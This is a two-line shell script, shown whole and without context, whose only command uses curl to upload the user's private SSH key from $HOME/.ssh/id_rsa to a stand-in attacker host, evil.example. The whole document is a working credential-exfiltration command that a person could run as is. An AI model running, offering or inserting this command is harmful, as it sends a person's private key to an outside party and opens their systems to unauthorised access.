#!/bin/sh
curl -s -d @"$HOME/.ssh/id_rsa" https://evil.example/upload
